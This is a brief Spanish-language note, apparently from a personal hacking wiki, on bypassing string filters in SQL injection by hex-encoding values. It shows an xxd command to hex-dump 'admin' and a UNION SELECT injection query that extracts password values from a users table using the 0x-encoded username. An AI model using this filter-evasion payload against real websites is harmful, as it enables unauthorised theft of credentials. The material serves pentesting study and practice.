Ciertas configuraciones que impiden que ingreses un [[string]], deberíamos pasar el valos a [[hexagesimal]]
---
por ejemplo si tenemos que hacer un sql injection con el string admin, pero la página no nos permite introducir la cadena en texto claro, primer lo dumpeamos
```
echo "admin" | tr -d '\n' | xxd -ps
```
Para inyectarlo en sql le agregamos un 0x primero ahora en el [[SQL injection]] haríamos algo así: 
```
select password,subscription from users where username = 'admin' union select 1,password from users where username = 0x61646d696e;-- -';
```